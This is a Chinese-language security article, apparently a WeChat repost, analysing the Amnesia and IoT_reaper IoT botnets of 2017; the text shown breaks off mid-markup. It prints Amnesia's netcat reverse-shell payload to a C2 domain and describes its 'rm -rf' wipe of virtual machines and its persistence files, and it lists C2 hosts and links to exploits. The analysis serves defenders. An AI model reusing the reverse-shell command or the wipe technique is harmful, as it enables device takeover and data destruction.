---
title: 盘点继 Mirai 后续2017年新出现的 IoT 僵尸网络
author: 阿東
wechat_source: >-
  http://mp.weixin.qq.com/s?timestamp=1515984875&src=3&ver=1&signature=yyLj*6br2FUtW3BtBE3siPPs-NRfvlwjuvH7xFTtLmsOPyUEuRfepE4lmADgDB-KqTGJpoTQDDroKcwkYhW3KcGinG8*4gyQqgWcetr5CFXvlyIA72IEwVNwVn1GU1mSJ6FijRbWmAjkpEhuP45r2m7buECjdA7DYXgrgPPzn7k=
date: '2018-01-13 00:00:00 +0000'

---

{% raw  %}
<p style="margin-right: 8px;margin-left: 8px;white-space: normal;letter-spacing: 2px;"><span style="font-size: 15px;color: rgb(79, 79, 79);"></span></p><p style="text-align: center;"><img src="https://mmbiz.qpic.cn/mmbiz_jpg/1UG7KPNHN8GMz3xtuyiaziaAmyuSrMMogFbmvUOteE5xVKKdHicXic4JpZkIg01vkPR65rzhPxxG25TUDprKxC3gzA/?wx_fmt=jpeg" style="width: 600px !important; height: 314px !important; visibility: visible !important;"></p><p style="margin-right: 8px;margin-left: 8px;white-space: normal;letter-spacing: 2px;"><span style="font-size: 15px;color: rgb(79, 79, 79);"></span><br></p><p style="margin-right: 8px;margin-left: 8px;white-space: normal;letter-spacing: 2px;"><span style="font-size: 15px;color: rgb(79, 79, 79);">由于2016年Mirai风波之后，造成的影响甚大。越来越多组织将攻击对象转向物联网设备，随后2017年 基于物联网模式传播以组建僵尸网络也成了一些地下组织的常态。本文以时间线来划分一下：三种最有代表性的僵尸网络。</span></p><p style="margin-right: 8px;margin-left: 8px;white-space: normal;letter-spacing: 2px;"><strong><span style="color: rgb(0, 81, 171);font-size: 18px;"><br></span></strong></p><p style="margin-right: 8px;margin-left: 8px;white-space: normal;letter-spacing: 2px;"><strong><span style="color: rgb(0, 81, 171);font-size: 18px;"><br></span></strong></p><p style="margin-right: 8px;margin-left: 8px;white-space: normal;letter-spacing: 2px;"><strong><span style="color: rgb(0, 81, 171);font-size: 18px;">Amnesia家族</span></strong></p><p style="margin-right: 8px;margin-left: 8px;white-space: normal;letter-spacing: 2px;"><span style="font-size: 15px;color: rgb(79, 79, 79);"></span></p><hr style="white-space: normal;"><p style="margin-right: 8px;margin-left: 8px;white-space: normal;letter-spacing: 2px;"><span style="font-size: 15px;color: rgb(79, 79, 79);"></span><br></p><p style="margin-right: 8px;margin-left: 8px;white-space: normal;letter-spacing: 2px;"><span style="font-size: 15px;color: rgb(79, 79, 79);">Amnesia僵尸网络的目标是未经修补、存在远程代码执行漏洞的设备。该漏洞于一年前于2016年3月在由TVT Digital制作的DVR（数字录像机）设备中公开披露，并由全球70多家供应商进行品牌宣传。</span></p><p style="margin-right: 8px;margin-left: 8px;white-space: normal;letter-spacing: 2px;"><span style="font-size: 15px;color: rgb(79, 79, 79);"><br></span></p><p style="margin-right: 8px;margin-left: 8px;white-space: normal;letter-spacing: 2px;"><span style="font-size: 15px;color: rgb(79, 79, 79);">根据扫描数据，这个漏洞影响全球大约<strong><span style="color: rgb(0, 81, 171);">22.7</span></strong>万台设备，其中台湾，美国，以色列，土耳其和印度是最受欢迎的设备。</span></p><p style="margin-right: 8px;margin-left: 8px;white-space: normal;letter-spacing: 2px;"><span style="font-size: 15px;color: rgb(79, 79, 79);"><br></span></p><p style="margin-right: 8px;margin-left: 8px;white-space: normal;letter-spacing: 2px;"><span style="font-size: 15px;color: rgb(79, 79, 79);">Amnesia恶意软件是第一个采用虚拟机逃逸技术来绕过linux沙箱保护的恶意软件。虚拟机逃逸技术通常与Microsoft Windows和Google Android恶意软件相关联。</span></p><p style="margin-right: 8px;margin-left: 8px;white-space: normal;letter-spacing: 2px;"><span style="font-size: 15px;color: rgb(79, 79, 79);"><br></span></p><p style="margin-right: 8px;margin-left: 8px;white-space: normal;letter-spacing: 2px;"><span style="font-size: 15px;color: rgb(79, 79, 79);">与这些类似，Amnesia试图检测它是否运行在基于VirtualBox，VMware或QEMU的虚拟机上，如果它检测到这些环境，它将通过删除文件系统中的所有文件来擦除虚拟化的Linux系统。这不仅会影响Linux恶意软件分析沙箱，还会影响VPS或公共云上的一些基于QEMU的Linux服务器。</span></p><p style="margin-right: 8px;margin-left: 8px;white-space: normal;letter-spacing: 2px;"><span style="font-size: 15px;color: rgb(79, 79, 79);"><br></span></p><p style="margin-right: 8px;margin-left: 8px;white-space: normal;letter-spacing: 2px;"><span style="font-size: 15px;color: rgb(79, 79, 79);">Amnesia通过扫描，定位易受攻击的设备来利用这个远程代码执行漏洞，一次成功的攻击就可导致Amnesia获得设备的完全控制。</span></p><p style="margin-right: 8px;margin-left: 8px;white-space: normal;letter-spacing: 2px;text-align: center;"><br></p><p style="margin-right: 8px;margin-left: 8px;white-space: normal;letter-spacing: 2px;"><span style="font-size: 15px;color: rgb(79, 79, 79);"><br></span></p><p style="margin-right: 8px;margin-left: 8px;white-space: normal;letter-spacing: 2px;"><span style="color: rgb(0, 81, 171);font-size: 16px;"><strong>技术细节：</strong></span></p><p style="white-space: normal;letter-spacing: 2px;"><br></p><p style="margin-right: 8px;margin-left: 8px;white-space: normal;letter-spacing: 2px;"><span style="font-size: 15px;color: rgb(79, 79, 79);">2016年3月22日，安全研究员Rotem Kerner向公众披露了这个漏洞。根据他的博客，全球有超过70家DVR供应商受到这个漏洞的影响。但是，所有的DVR设备都是由同一家公司“TVT Digital”生产的。</span></p><p style="margin-right: 8px;margin-left: 8px;white-space: normal;letter-spacing: 2px;"><span style="font-size: 15px;color: rgb(79, 79, 79);"><br></span></p><p style="margin-right: 8px;margin-left: 8px;white-space: normal;letter-spacing: 2px;"><span style="font-size: 15px;color: rgb(79, 79, 79);">此外，通过使用“Web服务器”的指纹，安全研究者发现超过22.7万个设备暴露在互联网上，可能是由TVT数字公司生产的。</span></p><p style="margin-right: 8px;margin-left: 8px;white-space: normal;letter-spacing: 2px;"><span style="font-size: 15px;color: rgb(79, 79, 79);"><br></span></p><p style="margin-right: 8px;margin-left: 8px;white-space: normal;letter-spacing: 2px;"><span style="color: rgb(79, 79, 79);font-size: 15px;">我们还搜索了Shodan.io和Censys.io上的关键字。他们分别报告了约50,000和约705,000个IP地址，下面显示了潜在易受攻击的TVT数字DVR设备排名前20位的国家/地区：</span><br></p><p style="margin-right: 8px;margin-left: 8px;white-space: normal;letter-spacing: 2px;text-align: center;"><span style="font-size: 15px;color: rgb(79, 79, 79);"><img src="http://mmbiz.qpic.cn/mmbiz_jpg/1UG7KPNHN8GMz3xtuyiaziaAmyuSrMMogFKJicmgPaXpicDCMdN7mqd1IPmjqp7nE6dDRCiaiaft7tXficaMzGiaJzeV7g/?wx_fmt=jpeg" style="cursor: pointer; width: 291px !important; height: 655px !important;"></span></p><p style="margin-right: 8px;margin-left: 8px;white-space: normal;letter-spacing: 2px;text-align: center;"><span style="font-size: 14px;color: rgb(111, 111, 111);">潜在易受影响的TVT DVR数字设备的前20个国家/地区</span></p><p style="margin-right: 8px;margin-left: 8px;white-space: normal;letter-spacing: 2px;"><span style="font-size: 15px;color: rgb(79, 79, 79);"><br></span></p><p style="margin-right: 8px;margin-left: 8px;white-space: normal;letter-spacing: 2px;"><span style="font-size: 15px;color: rgb(79, 79, 79);"><br></span></p><p style="margin-right: 8px;margin-left: 8px;white-space: normal;letter-spacing: 2px;"><span style="color: rgb(0, 81, 171);font-size: 16px;"><strong>漏洞利用和exploit开发</strong></span></p><p style="margin-right: 8px;margin-left: 8px;white-space: normal;letter-spacing: 2px;"><span style="font-size: 15px;color: rgb(79, 79, 79);"><br></span></p><p style="margin-right: 8px;margin-left: 8px;white-space: normal;letter-spacing: 2px;"><span style="font-size: 15px;color: rgb(79, 79, 79);">Amnesia僵尸网络使用IRC协议与其C2服务器进行通信。下图显示了它可接收的一些命令，包括通过不同类型的HTTP泛洪和UDP泛洪来发起DDoS攻击。</span></p><p style="margin-right: 8px;margin-left: 8px;white-space: normal;letter-spacing: 2px;"><span style="font-size: 15px;color: rgb(79, 79, 79);"><br></span></p><p style="margin-right: 8px;margin-left: 8px;white-space: normal;letter-spacing: 2px;text-align: center;"><img src="http://mmbiz.qpic.cn/mmbiz_png/1UG7KPNHN8GMz3xtuyiaziaAmyuSrMMogFnKFibMks0YZsTtXicHLwslet3sSYessJ0iaSEyJlMmr8ia4OoejHjaRzSg/?wx_fmt=png" style="cursor: pointer; width: 754px !important; height: 394.905px !important;"></p><p style="margin-right: 8px;margin-left: 8px;white-space: normal;letter-spacing: 2px;text-align: center;"><br></p><p style="margin-right: 8px;margin-left: 8px;white-space: normal;letter-spacing: 2px;"><span style="font-size: 15px;color: rgb(79, 79, 79);">Amnesia家族所用的C2命令，除了这些命令外，还实施了两个命令：CCTVSCANNER和CCTVPROCS。</span></p><p style="margin-right: 8px;margin-left: 8px;white-space: normal;letter-spacing: 2px;"><span style="font-size: 15px;color: rgb(79, 79, 79);"><br></span></p><p style="margin-right: 8px;margin-left: 8px;white-space: normal;letter-spacing: 2px;"><span style="font-size: 15px;color: rgb(79, 79, 79);">这些命令用于扫描和利用TVT数字硬盘录像机的RCE漏洞。接收到命令后，Amnesia首先会对该命令包含的IP地址进行简单的HTTP请求，检查目标是否为易受攻击的DVR设备。</span></p><p style="margin-right: 8px;margin-left: 8px;white-space: normal;letter-spacing: 2px;"><span style="font-size: 15px;color: rgb(79, 79, 79);"><br></span></p><p style="margin-right: 8px;margin-left: 8px;white-space: normal;letter-spacing: 2px;"><span style="font-size: 15px;color: rgb(79, 79, 79);">这是通过在HTTP响应内容中搜索一个特殊的字符串“Cross Web Server”完成的。如图所示，因为TVT Digital的DVR使用这个字符串作为HTTP头中的服务器名称。</span></p><p style="margin-right: 8px;margin-left: 8px;white-space: normal;letter-spacing: 2px;"><span style="font-size: 15px;color: rgb(79, 79, 79);"><br></span></p><p style="margin-right: 8px;margin-left: 8px;white-space: normal;letter-spacing: 2px;"><img src="http://mmbiz.qpic.cn/mmbiz_png/1UG7KPNHN8GMz3xtuyiaziaAmyuSrMMogFoR55nMTVNr8fgPibuLDjzzXkgKNBeypYBqDxytvyMp0muI75DRLnYJw/?wx_fmt=png" style="cursor: pointer; width: 649px !important; height: 169px !important;"></p><p style="margin-right: 8px;margin-left: 8px;letter-spacing: 0px;white-space: normal;"><br></p><p style="margin-right: 8px;margin-left: 8px;letter-spacing: 0px;white-space: normal;text-align: center;"><span style="font-size: 14px;color: rgb(111, 111, 111);">上图通过指纹检查目标是否是易受攻击的DVR</span></p><p style="margin-right: 8px;margin-left: 8px;white-space: normal;letter-spacing: 2px;"><span style="font-size: 15px;color: rgb(79, 79, 79);"><br></span></p><p style="margin-right: 8px;margin-left: 8px;white-space: normal;letter-spacing: 2px;"><span style="font-size: 15px;color: rgb(79, 79, 79);">如果发现一个易受攻击的DVR，Amnesia将发送四个HTTP请求，其中包含四个不同shell命令的payload，这些命令是：</span></p><blockquote style="white-space: normal;"><p style="margin-right: 8px;margin-left: 8px;letter-spacing: 0px;"><span style="color: rgb(79, 79, 79);font-size: 12px;">echo “nc” &gt; f</span></p><p style="margin-right: 8px;margin-left: 8px;letter-spacing: 0px;"><span style="color: rgb(79, 79, 79);font-size: 12px;">echo “{one_of_c2_domains}” &gt;&gt; f</span></p><p style="margin-right: 8px;margin-left: 8px;letter-spacing: 0px;"><span style="color: rgb(79, 79, 79);font-size: 12px;">echo “8888 –e $SHELL” &gt;&gt; f</span></p><p style="margin-right: 8px;margin-left: 8px;letter-spacing: 0px;"><span style="color: rgb(79, 79, 79);font-size: 12px;">$(cat f) &amp; &gt; r</span></p></blockquote><p style="margin-right: 8px;margin-left: 8px;white-space: normal;letter-spacing: 2px;"><span style="font-size: 15px;color: rgb(79, 79, 79);"><br></span></p><p style="margin-right: 8px;margin-left: 8px;white-space: normal;letter-spacing: 2px;"><span style="font-size: 15px;color: rgb(79, 79, 79);">这些命令创建一个shell脚本并执行它。脚本内容是与Amnesia C2服务器之一连接，并获取shell。因此，受感染的设备将会受到威胁，并会侦听来自C2服务器的进一步shell命令，如下图所示</span></p><p style="margin-right: 8px;margin-left: 8px;white-space: normal;letter-spacing: 2px;"><span style="font-size: 15px;color: rgb(79, 79, 79);"><br></span></p><p style="margin-right: 8px;margin-left: 8px;white-space: normal;letter-spacing: 2px;"><img src="http://mmbiz.qpic.cn/mmbiz_png/1UG7KPNHN8GMz3xtuyiaziaAmyuSrMMogFwZ7eTAWyte369t60dgaNiaiaibev1sZXZl8LzXce1nT9bgRic56LnbnqGw/?wx_fmt=png" style="cursor: pointer; width: 663px !important; height: 421px !important;"></p><p style="margin-right: 8px;margin-left: 8px;white-space: normal;letter-spacing: 2px;"><span style="color: rgb(0, 81, 171);font-size: 16px;"><strong><br></strong></span></p><p style="margin-right: 8px;margin-left: 8px;white-space: normal;letter-spacing: 2px;"><span style="color: rgb(0, 81, 171);font-size: 16px;"><strong><br></strong></span></p><p style="margin-right: 8px;margin-left: 8px;white-space: normal;letter-spacing: 2px;"><span style="color: rgb(0, 81, 171);font-size: 16px;"><strong>反取证</strong></span></p><p style="margin-right: 8px;margin-left: 8px;white-space: normal;letter-spacing: 2px;"><span style="font-size: 15px;color: rgb(79, 79, 79);"><br></span></p><p style="margin-right: 8px;margin-left: 8px;letter-spacing: 0px;white-space: normal;"><span style="font-size: 15px;color: rgb(79, 79, 79);">当Amnesia样本执行时，它会通过读取文件 / sys / class / dmi / id / product_name 和 / sys / class / dmi / id / sys_vendor 并且将文件内容与关键字“VirtualBox “，”VMware“和”QEMU“，Linux DMI（桌面管理界面）使用这两个文件来存储硬件的产品和制造商信息。这些包含在DMI文件中的字符串意味着Linux系统分别在基于VirtualBox，VMware或QEMU的虚拟机中运行。</span></p><p style="margin-right: 8px;margin-left: 8px;white-space: normal;letter-spacing: 2px;"><span style="font-size: 15px;color: rgb(79, 79, 79);"><br></span></p><p style="margin-right: 8px;margin-left: 8px;white-space: normal;letter-spacing: 2px;"><img src="http://mmbiz.qpic.cn/mmbiz_png/1UG7KPNHN8GMz3xtuyiaziaAmyuSrMMogFbPXRD2qCw1oGTbvlXuLAWB1TpabY0rTb19JichOPiaMicSsC1kHYtYgmQ/?wx_fmt=png" style="cursor: pointer; width: 646px !important; height: 317px !important;"></p><p style="margin-right: 8px;margin-left: 8px;white-space: normal;letter-spacing: 2px;"><span style="font-size: 15px;color: rgb(79, 79, 79);"><br></span></p><p style="margin-right: 8px;margin-left: 8px;white-space: normal;letter-spacing: 2px;"><span style="font-size: 15px;color: rgb(79, 79, 79);">如果检测到虚拟机，Amnesia会自行删除，然后尝试删除所有以下目录：</span></p><p style="margin-right: 8px;margin-left: 8px;white-space: normal;letter-spacing: 2px;"><span style="font-size: 15px;color: rgb(79, 79, 79);"><br></span></p><blockquote style="white-space: normal;"><p style="margin-right: 8px;margin-left: 8px;letter-spacing: 2px;"><span style="font-size: 15px;color: rgb(79, 79, 79);">Linux根目录“/”，<br>当前用户的主目录“〜/”和<br>当前工作目录“./<br></span></p></blockquote><p style="margin-right: 8px;margin-left: 8px;white-space: normal;letter-spacing: 2px;"><span style="font-size: 15px;color: rgb(79, 79, 79);"><br></span></p><p style="margin-right: 8px;margin-left: 8px;white-space: normal;letter-spacing: 2px;"><span style="font-size: 15px;color: rgb(79, 79, 79);">这些删除操作基本上等同于擦除整个Linux系统。它们是通过简单地执行shell命令“rm -rf”来实现的，如下图所示。对于每个目录，“rm”命令将被执行两次 – 一个在后台，一个在前台。因此，删除这三个目录将是平行的。最后，Amnesia等待删除完成。</span></p><p style="white-space: normal;letter-spacing: 2px;"><br></p><p style="margin-right: 8px;margin-left: 8px;white-space: normal;letter-spacing: 2px;"><img src="http://mmbiz.qpic.cn/mmbiz_png/1UG7KPNHN8GMz3xtuyiaziaAmyuSrMMogF2yFDicMGcByoMp6KwxTXQ77U8nicwURnRML0pPkhgZicQk651krHib0cwQ/?wx_fmt=png" style="cursor: pointer; width: 731px !important; height: 229px !important;"></p><p style="margin-right: 8px;margin-left: 8px;white-space: normal;letter-spacing: 2px;"><span style="font-size: 15px;color: rgb(79, 79, 79);"><br></span></p><p style="margin-right: 8px;margin-left: 8px;white-space: normal;letter-spacing: 2px;"><span style="font-size: 15px;color: rgb(79, 79, 79);">Amnesia的作者正打算击败基于Linux的恶意软件分析沙箱，并且由于代码中的硬编码字符串（“fxxkwhitehats”）而给安全研究人员带来麻烦。但是，基于虚拟机的沙箱通常会启用系统快照，从而可以快速恢复到原始状态（尽管样本的分析任务可能会被破坏）在这些情况下，影响将受到限制。</span></p><p style="margin-right: 8px;margin-left: 8px;white-space: normal;letter-spacing: 2px;"><span style="font-size: 15px;color: rgb(79, 79, 79);"><br></span></p><p style="margin-right: 8px;margin-left: 8px;white-space: normal;letter-spacing: 2px;"><span style="font-size: 15px;color: rgb(79, 79, 79);">真正的问题是，如果恶意软件感染了某些基于QEMU的Linux服务器实例，比如VPS厂商提供的虚拟主机，则Linux服务器也将被清除，如果备份不可用，这可能是灾难性的。</span></p><p style="margin-right: 8px;margin-left: 8px;white-space: normal;letter-spacing: 2px;"><span style="font-size: 15px;color: rgb(79, 79, 79);"><br></span></p><p style="margin-right: 8px;margin-left: 8px;white-space: normal;letter-spacing: 2px;"><span style="font-size: 15px;color: rgb(79, 79, 79);">VM检查后，Amnesia会在/etc/init.d/.rebootime和/etc/cron.daily/.reboottime或〜/ .bashrc和〜/ .bash_history中创建持久性文件，具体取决于当前用户的权限。然后杀死所有Telnet和SSH相关的进程，并连接到C2服务器以接收更多命令。</span></p><p style="margin-right: 8px;margin-left: 8px;white-space: normal;letter-spacing: 2px;"><span style="font-size: 15px;color: rgb(79, 79, 79);"><br></span></p><p style="margin-right: 8px;margin-left: 8px;white-space: normal;letter-spacing: 2px;"><span style="font-size: 15px;color: rgb(79, 79, 79);">Amnesia硬编码的三个域名，“irc.freenode.net”作为诱饵C2服务器地址。然而，真正的C2配置在运行时通过简单的凯撒密码算法进行解密。它选择这三个服务器之一：</span></p><p style="white-space: normal;letter-spacing: 2px;"><br></p><blockquote style="white-space: normal;"><p style="margin-right: 8px;margin-left: 8px;letter-spacing: 0px;"><span style="color: rgb(79, 79, 79);font-size: 12px;">ukranianhorseriding[.]net</span></p><p style="margin-right: 8px;margin-left: 8px;letter-spacing: 0px;"><span style="color: rgb(79, 79, 79);font-size: 12px;">surrealzxc.co[.]za</span></p><p style="margin-right: 8px;margin-left: 8px;letter-spacing: 0px;"><span style="color: rgb(79, 79, 79);font-size: 12px;">inversefierceapplied[.]pw</span></p></blockquote><p style="white-space: normal;letter-spacing: 2px;"><br></p><p style="margin-right: 8px;margin-left: 8px;white-space: normal;letter-spacing: 2px;"><span style="font-size: 15px;color: rgb(79, 79, 79);">自2016&nbsp;年12月1&nbsp;日起，所有这三个域名均已解析为相同的IP地址93.174.95 .38。在此之前，IP地址还用于托管其他物联网/ Linux恶意软件，如DropPerl。</span></p><p style="margin-right: 8px;margin-left: 8px;white-space: normal;letter-spacing: 2px;"><span style="font-size: 15px;color: rgb(79, 79, 79);"><br></span></p><p style="margin-right: 8px;margin-left: 8px;white-space: normal;letter-spacing: 2px;"><span style="font-size: 15px;color: rgb(79, 79, 79);"><br></span></p><h1 style="margin-right: 8px;margin-left: 8px;white-space: normal;letter-spacing: 2px;"><span style="color: rgb(0, 81, 171);font-size: 18px;"><strong>IoT_reaper家族</strong></span></h1><p style="white-space: normal;"><span style="font-size: 15px;color: rgb(79, 79, 79);"></span></p><hr style="white-space: normal;"><p style="white-space: normal;"><span style="font-size: 15px;color: rgb(79, 79, 79);"></span><br></p><p style="margin-right: 8px;margin-left: 8px;white-space: normal;letter-spacing: 2px;"><span style="font-size: 15px;color: rgb(79, 79, 79);">Iot_reaper家族从著名的Mirai僵尸网络借用了一些代码，但并不没有加入密码破解功能，反而是利用物联网设备的漏洞，所以把它命名为Iot_reaper，Iot_reaper相当大，也正在不段扩展。</span></p><p style="margin-right: 8px;margin-left: 8px;white-space: normal;letter-spacing: 2px;"><span style="font-size: 15px;color: rgb(79, 79, 79);"><br></span></p><p style="margin-right: 8px;margin-left: 8px;white-space: normal;letter-spacing: 2px;"><span style="font-size: 15px;color: rgb(79, 79, 79);">最近一次来自C2的数据（10月19日）显示，唯一活动的bot的IP地址数量每天超过10k。与此同时，有数百万潜在的易受攻击的设备IP正在排队等待由自动加载程序处理的c2系统，该加载程序会向设备注入恶意代码以扩大僵尸网络，僵尸网络部分借用了一些mirai源代码，但是与mirai在几个关键行为上有明显的不同，其中包括：</span></p><p style="margin-right: 8px;margin-left: 8px;white-space: normal;letter-spacing: 2px;"><span style="font-size: 15px;color: rgb(79, 79, 79);"><br></span></p><ul class="list-paddingleft-2" style="list-style-type: disc;"><li><p style="margin-right: 8px;margin-left: 8px;white-space: normal;letter-spacing: 2px;"><span style="font-size: 15px;color: rgb(79, 79, 79);">不再破解任何弱密码，只能利用物联网设备的漏洞</span></p></li><li><p style="margin-right: 8px;margin-left: 8px;white-space: normal;letter-spacing: 2px;"><span style="font-size: 15px;color: rgb(79, 79, 79);">集成LUA执行环境，可以支持和执行更复杂的攻击</span></p></li><li><p style="margin-right: 8px;margin-left: 8px;white-space: normal;letter-spacing: 2px;"><span style="font-size: 15px;color: rgb(79, 79, 79);">扫描动作比较小, 所以不会触发一些安全警告或者防火墙之类</span></p></li></ul><p style="white-space: normal;letter-spacing: 2px;"><br></p><p style="margin-right: 8px;margin-left: 8px;white-space: normal;letter-spacing: 2px;"><span style="font-size: 15px;color: rgb(79, 79, 79);">设备与C2服务器数据交互的模式 :&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;</span></p><ul class="list-paddingleft-2" style=""><li><p style="margin-right: 8px;margin-left: 8px;letter-spacing: 2px;"><span style="font-size: 15px;color: rgb(79, 79, 79);">样本下载服务器：162.211.183.192，可以从这个服务器下载bot程序，它通常使用“d”作为二级域名，如 d .hl852 .com</span></p></li><li><p style="margin-right: 8px;margin-left: 8px;letter-spacing: 2px;"><span style="font-size: 15px;color: rgb(79, 79, 79);">主控端服务器： 27.102.101.121，用于控制设备，发送命令，通常使用“e”作为子域，如 e.hl852 .com</span></p></li><li><p style="margin-right: 8px;margin-left: 8px;letter-spacing: 2px;"><span style="color: rgb(79, 79, 79);font-size: 15px;">扫描服务器：222.112.82.231，用于收集的潜在存在漏洞的设备信息，通常使用“f”作为子域，如f .hl852.com。</span></p></li><li><p style="margin-right: 8px;margin-left: 8px;letter-spacing: 2px;"><span style="color: rgb(79, 79, 79);font-size: 15px;">攻击服务器：119.82.26.157，通过漏洞将bot程序植入扫描服务器收集的设备中</span></p></li></ul><p style="white-space: normal;letter-spacing: 2px;"><br></p><p style="margin-right: 8px;margin-left: 8px;white-space: normal;letter-spacing: 2px;"><span style="font-size: 15px;color: rgb(79, 79, 79);">下图显示了上述4个IP的流量模式：&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;</span><img src="http://mmbiz.qpic.cn/mmbiz_png/1UG7KPNHN8GMz3xtuyiaziaAmyuSrMMogFcrlF5wQP8Zrk3CY2iccyD53TmReu5V8HDsbVw0EkOWiaT01SmkStPgibg/?wx_fmt=png" style="cursor: pointer; width: 542px !important; height: 178.463px !important;"></p><p style="margin-right: 8px;margin-left: 8px;white-space: normal;letter-spacing: 2px;"><span style="font-size: 15px;color: rgb(79, 79, 79);">Iot_reaper中集成的9个IoT漏洞攻击</span></p><p style="margin-right: 8px;margin-left: 8px;white-space: normal;letter-spacing: 2px;"><span style="font-size: 15px;color: rgb(79, 79, 79);">与使用弱密码破解的Mirai不同，IoT_reaper利用多个物联网设备漏洞感染物联网设备。我们注意到9个IoT漏洞利用已经被整合到当前的样本中，如下所示：</span></p><p style="margin-right: 8px;margin-left: 8px;white-space: normal;letter-spacing: 2px;"><span style="font-size: 15px;color: rgb(79, 79, 79);"><br></span></p><ol class="list-paddingleft-2" style=""><li><p style="margin-right: 8px;margin-left: 8px;letter-spacing: 0px;"><span style="font-size: 15px;color: rgb(79, 79, 79);">Dlink&nbsp;</span><span style="font-size: 15px;color: rgb(79, 79, 79);">https://blogs.securiteam.com/index.php/archives/3364</span></p></li><li><p style="margin-right: 8px;margin-left: 8px;letter-spacing: 0px;"><span style="font-size: 15px;color: rgb(79, 79, 79);">Goahead&nbsp;</span><span style="font-size: 15px;color: rgb(79, 79, 79);">https://pierrekim.github.io/blog/2017-03-08-camera-goahead-0day.html</span></p></li><li><p style="margin-right: 8px;margin-left: 8px;letter-spacing: 0px;"><span style="font-size: 15px;color: rgb(79, 79, 79);">JAWS&nbsp;</span><span style="font-size: 15px;color: rgb(79, 79, 79);">https://www.pentestpartners.com/blog/pwning-cctv-cameras/</span></p></li><li><p style="margin-right: 8px;margin-left: 8px;letter-spacing: 0px;"><span style="font-size: 15px;color: rgb(79, 79, 79);">Netgear&nbsp;</span><span style="font-size: 15px;color: rgb(79, 79, 79);">https://blogs.securiteam.com/index.php/archives/3409</span></p></li><li><p style="margin-right: 8px;margin-left: 8px;letter-spacing: 0px;"><span style="font-size: 15px;color: rgb(79, 79, 79);">Vacron&nbsp;NVR&nbsp;</span><span style="font-size: 15px;color: rgb(79, 79, 79);">https://blogs.securiteam.com/index.php/archives/3445</span></p></li><li><p style="margin-right: 8px;margin-left: 8px;letter-spacing: 0px;"><span style="font-size: 15px;color: rgb(79, 79, 79);">网件&nbsp;</span><span style="font-size: 15px;color: rgb(79, 79, 79);">http://seclists.org/bugtraq/2013/Jun/8</span></p></li><li><p style="margin-right: 8px;margin-left: 8px;letter-spacing: 0px;"><span style="font-size: 15px;color: rgb(79, 79, 79);">Linksys&nbsp;</span><span style="font-size: 15px;color: rgb(79, 79, 79);">http://www.s3cur1ty.de/m1adv2013-004</span></p></li><li><p style="margin-right: 8px;margin-left: 8px;letter-spacing: 0px;"><span style="font-size: 15px;color: rgb(79, 79, 79);">dlink&nbsp;</span><span style="font-size: 15px;color: rgb(79, 79, 79);">http://www.s3cur1ty.de/m1adv2013-003</span></p></li><li><p style="margin-right: 8px;margin-left: 8px;letter-spacing: 0px;"><span style="font-size: 15px;color: rgb(79, 79, 79);">AVTECH&nbsp;</span><span style="font-size: 15px;color: rgb(79, 79, 79);">https://github.com/Trietptm-on-Security/AVTECH</span></p></li></ol><p style="white-space: normal;letter-spacing: 2px;"><br></p><p style="margin-right: 8px;margin-left: 8px;white-space: normal;letter-spacing: 2px;"><img src="http://mmbiz.qpic.cn/mmbiz_png/1UG7KPNHN8GMz3xtuyiaziaAmyuSrMMogFrfKJzwIBibVGzFYOP4eibAO3oaB5iat9IHwzy31hZDersiblN0HNAiarjUg/?wx_fmt=png" style="cursor: pointer; width: 720px !important; height: 489px !important;"></p><p style="margin-right: 8px;margin-left: 8px;white-space: normal;letter-spacing: 2px;"><span style="font-size: 15px;color: rgb(79, 79, 79);"><br></span></p><p style="margin-right: 8px;margin-left: 8px;white-space: normal;letter-spacing: 2px;"><span style="font-size: 15px;color: rgb(79, 79, 79);">攻击者不断地在样本中增加了更多的新漏洞，其中一个在漏洞发布后两天就被采用。</span></p><p style="margin-right: 8px;margin-left: 8px;white-space: normal;letter-spacing: 2px;"><span style="font-size: 15px;color: rgb(79, 79, 79);"><br></span></p><p style="margin-right: 8px;margin-left: 8px;white-space: normal;letter-spacing: 2px;"><span style="font-size: 15px;color: rgb(79, 79, 79);">2017年10月8日，Vacron NVR远程攻击被曝光，2017年10月10日之前被加入bot样本;在2017-10-12和2017-10-16的两个更新中分别添加3个和1个漏洞利用;</span></p><p style="margin-right: 8px;margin-left: 8px;white-space: normal;letter-spacing: 2px;"><span style="font-size: 15px;color: rgb(79, 79, 79);"><br></span></p><p style="margin-right: 8px;margin-left: 8px;white-space: normal;letter-spacing: 2px;"><span style="font-size: 15px;color: rgb(79, 79, 79);">集成在Iot_reaper中的LUA执行环境，基于集成的LUA执行环境，作者现在可以编写非常复杂和高效的攻击脚本，大约100个DNS开放式解析器被集成在这个恶意软件中，直到现在还没有观察到DDoS攻击命令<br></span></p><p style="margin-right: 8px;margin-left: 8px;white-space: normal;letter-spacing: 2px;"><span style="font-size: 15px;color: rgb(79, 79, 79);">Md5：CA92A3B74A65CE06035FCC280740DAF6<br></span></p><p style="margin-right: 8px;margin-left: 8px;white-space: normal;letter-spacing: 2px;"><span style="font-size: 15px;color: rgb(79, 79, 79);"><br></span></p><p style="margin-right: 8px;margin-left: 8px;white-space: normal;letter-spacing: 2px;"><span style="font-size: 15px;color: rgb(79, 79, 79);">僵尸网络在其lua示例中嵌入了超过100个DNS开放解析器，因此可以轻松地进行dns放大攻击。与我们的DRDoS数据馈送进行交叉检查表明，这些开放式DNS服务器中有三分之一已经被用作实时DNS放大攻击的反射器，目前还没有看到任何其他mirai变种的这种类型的配置。</span></p><p style="margin-right: 8px;margin-left: 8px;white-space: 